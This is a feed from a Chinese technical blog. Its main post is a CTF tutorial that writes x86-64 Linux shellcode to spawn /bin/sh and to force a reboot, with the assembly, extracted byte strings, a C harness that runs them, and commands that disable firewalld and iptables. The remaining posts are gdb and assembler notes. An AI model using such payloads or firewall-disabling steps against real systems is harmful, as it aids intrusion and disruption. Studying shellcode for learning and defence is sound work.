<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术栈</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-08-08T14:42:24.298Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux_shellcode开发之实战</title>
    <link href="https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/"/>
    <id>https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/</id>
    <published>2022-08-08T14:39:50.000Z</published>
    <updated>2022-08-08T14:42:24.298Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-打开-terminal"><a class="markdownIt-Anchor" href="#1-打开-terminal"></a> 1. 打开 terminal</h2><p>首先我们来试试最经典的例子 ---- 打开 terminal</p><p>那么问题来了用c语言该怎么写？</p><blockquote><p>int execve(const char *<em><strong>filename</strong></em>, char *const <strong>argv</strong>[], char *const <strong>envp</strong>[]);</p><p>filename:要执行的程序</p><p>argv[]：传递给新程序的参数字符串数组</p><p>envp[]:传递给新程序的环境变量字符串数组</p></blockquote><h3 id="11-c语言版本"><a class="markdownIt-Anchor" href="#11-c语言版本"></a> 1.1 C语言版本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">name[<span class="number">0</span>] = <span class="string">&quot;bin/sh&quot;</span>;</span><br><span class="line">name[<span class="number">1</span>] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用gcc编译一下，看看能否运行？</p><ul><li>-z execstack 关闭canary</li><li>-g 添加信息，便于gdb调试</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc getTerminal.c -o terminal -z execstack -g</span><br><span class="line">./terminal</span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220806232610222.png" alt="image-20220806232610222"></p><p>可以看到程序成功执行，说明我们的思路没有问题。</p><h3 id="12-写汇编"><a class="markdownIt-Anchor" href="#12-写汇编"></a> 1.2 写汇编</h3><p>从上面可以看到，这个 execve(“bin/sh”, [“bin/sh”], NULL) 参数是没有问题的，根据 execve 的系统调用号 0x3b 来布置函数栈帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_sh64.o -o execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220807220010173.png" alt="image-20220807220010173"></p><h3 id="13-提取机器码"><a class="markdownIt-Anchor" href="#13-提取机器码"></a> 1.3 提取机器码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/execveDir$ objdump -d execve_sh64</span><br><span class="line"></span><br><span class="line">execve_sh64：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 d2             xor    %rdx,%rdx</span><br><span class="line">  401003:48 bb 2f 2f 62 69 6e movabs $0x68732f6e69622f2f,%rbx</span><br><span class="line">  40100a:2f 73 68 </span><br><span class="line">  40100d:48 c1 eb 08          shr    $0x8,%rbx</span><br><span class="line">  401011:53                   push   %rbx</span><br><span class="line">  401012:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  401015:50                   push   %rax</span><br><span class="line">  401016:57                   push   %rdi</span><br><span class="line">  401017:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  40101a:b0 3b                mov    $0x3b,%al</span><br><span class="line">  40101c:0f 05                syscall </span><br><span class="line"></span><br><span class="line">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; </span><br></pre></td></tr></table></figure><h3 id="14-测试"><a class="markdownIt-Anchor" href="#14-测试"></a> 1.4 测试</h3><p>将机器码嵌入C语言运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc execve_sh64.c -o execve_sh64 -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span></span><br></pre></td></tr></table></figure><p>成功执行。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220807230925573.png" alt="image-20220807230925573"></p><h2 id="2-重启-reboot"><a class="markdownIt-Anchor" href="#2-重启-reboot"></a> 2. 重启 reboot</h2><h3 id="21-找到指令位置"><a class="markdownIt-Anchor" href="#21-找到指令位置"></a> 2.1 找到指令位置</h3><p>首先，查看 reboot 命令所在位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">whereis reboot</span></span><br><span class="line">reboot: /usr/sbin/reboot /usr/share/man/man8/reboot.8.gz</span><br></pre></td></tr></table></figure><p>用此路径（/usr/sbin/reboot）作为参数，进行系统调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/usr/sbin/reboot&quot;, [&quot;/usr/sbin/reboot&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;/usr/sbin/reboot&#x27;, rsi = &#x27;/usr/sbin/reboot&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">push  rdx</span><br><span class="line">movrbx, &#x27;n/reboot&#x27;</span><br><span class="line">pushrbx</span><br><span class="line">mov rbx, &#x27;/usr/sbi&#x27;</span><br><span class="line">push rbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h3 id="22-编译链接运行"><a class="markdownIt-Anchor" href="#22-编译链接运行"></a> 2.2 编译链接运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_reboot.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_reboot.o -o execve_reboot</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_reboot</span></span><br></pre></td></tr></table></figure><p>然后就重启了。</p><h3 id="23-提取机器码"><a class="markdownIt-Anchor" href="#23-提取机器码"></a> 2.3 提取机器码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d execve_reboot</span> </span><br><span class="line"></span><br><span class="line">execve_reboot：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 d2             xor    %rdx,%rdx</span><br><span class="line">  401003:52                   push   %rdx</span><br><span class="line">  401004:48 bb 6e 2f 72 65 62 movabs $0x746f6f6265722f6e,%rbx</span><br><span class="line">  40100b:6f 6f 74 </span><br><span class="line">  40100e:53                   push   %rbx</span><br><span class="line">  40100f:48 bb 2f 75 73 72 2f movabs $0x6962732f7273752f,%rbx</span><br><span class="line">  401016:73 62 69 </span><br><span class="line">  401019:53                   push   %rbx</span><br><span class="line">  40101a:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  40101d:50                   push   %rax</span><br><span class="line">  40101e:57                   push   %rdi</span><br><span class="line">  40101f:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  401022:b0 3b                mov    $0x3b,%al</span><br><span class="line">  401024:0f 05                syscall </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br></pre></td></tr></table></figure><h3 id="24-测试"><a class="markdownIt-Anchor" href="#24-测试"></a> 2.4 测试</h3><p>将机器码嵌入c语言运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc execve_reboot.c -o execve_reboot -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_reboot</span></span><br></pre></td></tr></table></figure><p>成功重启。</p><h2 id="3-关闭防火墙"><a class="markdownIt-Anchor" href="#3-关闭防火墙"></a> 3 关闭防火墙</h2><p>与防火墙相关的指令，转载于：<a href="https://www.cnblogs.com/jxldjsn/p/10794171.html">Linux关闭防火墙命令</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1:查看防火状态</span><br><span class="line">systemctl status firewalld</span><br><span class="line">service  iptables status</span><br><span class="line"></span><br><span class="line">2:暂时关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">service  iptables stop</span><br><span class="line"></span><br><span class="line">3:永久关闭防火墙</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables off</span><br><span class="line"></span><br><span class="line">4:重启防火墙</span><br><span class="line">systemctl enable firewalld</span><br><span class="line">service iptables restart </span><br><span class="line"></span><br><span class="line">5:永久关闭后重启</span><br><span class="line">//暂时还没有试过</span><br><span class="line">chkconfig iptables on</span><br></pre></td></tr></table></figure><p>。。。未完待续。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-打开-terminal&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-打开-terminal&quot;&gt;&lt;/a&gt; 1. 打开 terminal&lt;/h2&gt;
&lt;p&gt;首先我们来试试最经典的例子 ---- 打开 ter</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>gdb显示intel和at&amp;t汇编</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Cat-t%E6%B1%87%E7%BC%96/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Cat-t%E6%B1%87%E7%BC%96/</id>
    <published>2022-08-08T14:36:22.000Z</published>
    <updated>2022-08-08T14:38:19.182Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://blog.csdn.net/freezing111/article/details/70576865">Linux下gdb显示intel和at&amp;t汇编</a></p><p>在windows下使用习惯了intel汇编，在Linux下看的难受，在gdb下使用</p><p>set disassembly-flavor intel 转换为intel格式的汇编</p><p>set disassembly-flavor att 转换为att格式的汇编</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://blog.csdn.net/freezing111/article/details/70576865&quot;&gt;Linux下gdb显示intel和at&amp;amp;t汇编&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在windows下使用习惯了intel汇编，在</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>gdb调试带参程序</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-08-08T14:33:41.000Z</published>
    <updated>2022-08-08T14:36:56.316Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://www.cnblogs.com/rosesmall/archive/2012/04/10/2440514.html">gdb调试带参数程序</a></p><p><strong>具体来说就是</strong></p><p><strong>例如一个程序名为prog 参数为 -l a -C abc<br>则，运行gcc/g++ -g prog.c/cpp -o prog</strong></p><p><strong>就可以用gdb调试程序prog<br>#gdb prog</strong></p><p><strong>进入gdb调试界面</strong></p><p><strong>输入参数命令set args 后面加上程序所要用的参数，注意，不再带有程序名，直接加参数，如：<br>set args -l a -C abc</strong></p><p><strong>回车后输入</strong></p><p><strong>r</strong></p><p><strong>即可开始</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.cnblogs.com/rosesmall/archive/2012/04/10/2440514.html&quot;&gt;gdb调试带参数程序&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体来说就是&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;s</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>gdb插件自动切换</title>
    <link href="https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/"/>
    <id>https://www.rgzzplus.com/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/</id>
    <published>2022-08-08T14:31:58.000Z</published>
    <updated>2022-08-08T14:37:54.345Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<a href="https://www.cnblogs.com/welhzh/p/13958736.html">gdb 的配置、插件plugin与多彩显示 </a></p><p>PwnDbg、gef、peda 的自动切换，其实就是切换配置文件：</p><p>先把他们全部装上，当然你可以选择自己感兴趣的安装，他们的配置都需要通过 ~/.gdbinit 来配置，因此他们是互斥的，配置里只能配置一种，但是可以用下面的这种方法解决，下面的示例只写了 peda、PwnDbg和gef，其它自己加。</p><p>1、Open your .gdbinit file, delete any contents and paste the following configuration:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">define init-peda</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">end</span><br><span class="line">document init-peda</span><br><span class="line">Initializes the PEDA (Python Exploit Development Assistant for GDB) framework</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-pwndbg</span><br><span class="line">source ~/.gdbinit_pwndbg</span><br><span class="line">end</span><br><span class="line">document init-pwndbg</span><br><span class="line">Initializes PwnDBG</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-gef</span><br><span class="line">source ~/.gdbinit-gef.py</span><br><span class="line">end</span><br><span class="line">document init-gef</span><br><span class="line">Initializes GEF (GDB Enhanced Features)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>Then, create the following 3 files in one of your $PATH folder:<br>然后，分别创建下列三个文件在你的 $PATH 文件夹中（查看$PATH文件夹命令：echo $PATH）：</p><p>First create a file named by gdb-peda and paste the following:<br>首先创建一个名为 gdb-peda 的文件，并将下列内容复制进去：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-peda &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>Then gdb-pwndbg:<br>然后是 gdb-pwndbg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-pwndbg &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>Then gdb-gef:<br>然后是 gdb-gef：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-gef &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>最后分别修改它们的可执行权限：（注：<mark>gdb-* 代表 gdb-gef、gdb-peda、gdb-pwndbg</mark>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/bin/gdb-*</span><br></pre></td></tr></table></figure><p>然后你就可以使用 gdb-peda, gdb-pwndbg 或 gdb-gef 来运行相应的gdb plugin版了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.cnblogs.com/welhzh/p/13958736.html&quot;&gt;gdb 的配置、插件plugin与多彩显示 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PwnDbg、gef、peda 的自动切换，其实就是切换配置文件：&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Linux汇编之伪指令</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/</id>
    <published>2022-08-05T12:56:04.000Z</published>
    <updated>2022-08-05T13:12:06.936Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Reesun<br>链接：<a href="http://blog.chinaunix.net/uid-20548989-id-1667484.html">http://blog.chinaunix.net/uid-20548989-id-1667484.html</a><br>来源：Chinaunix</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br></pre></td></tr></table></figure><p>汇编程序中以<code>.</code>开头的名称并不是指令的助记符，不会被翻译成机器指令，而是给汇编器一些特殊指示，称为汇编指示（Assembler Directive）或伪操作（Pseudo-operation），由于它不是真正的指令所以加个“伪”字。<code>.section</code>指示把代码划分成若干个段（Section），程序被操作系统加载执行时，每个段被加载到不同的地址，操作系统对不同的页面设置不同的读、写、执行权限。</p><p><code>.data</code>段保存程序的数据，是<mark>可读可写</mark>的，相当于C程序的全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br></pre></td></tr></table></figure><p><code>.text</code>段保存代码，是<mark>只读和可执行</mark>的，后面那些指令都属于<code>.text</code>段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br></pre></td></tr></table></figure><p><code>_start</code>是一个符号（Symbol），符号在汇编程序中<mark>代表一个地址</mark>，可以用在指令中，汇编程序经过汇编器的处理之后，所有的符号都被替换成它所代表的地址值。在C语言中我们通过变量名访问一个变量，其实就是读写某个地址的内存单元，我们通过函数名调用一个函数，其实就是跳转到该函数第一条指令所在的地址，所以变量名和函数名都是符号，本质上是代表内存地址的。</p><p><code>.globl</code>指示告诉汇编器，<code>_start</code>这个符号要被链接器用到，所以要在目标文件的符号表中标记它是一个全局符号（在<a href="http://learn.akae.cn/media/ch18s05.html#asm.relocatable">第 5.1 节 “目标文件”</a>详细解释）。<code>_start</code>就像C程序的<code>main</code>函数一样特殊，是<mark>整个程序的入口</mark>，链接器在链接时会查找目标文件中的<code>_start</code>符号代表的地址，把它设置为整个程序的入口地址，所以每个汇编程序都要提供一个<code>_start</code>符号并且用<code>.globl</code>声明。<strong>如果一个符号没有用<code>.globl</code>声明，就表示这个符号不会被链接器用到</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 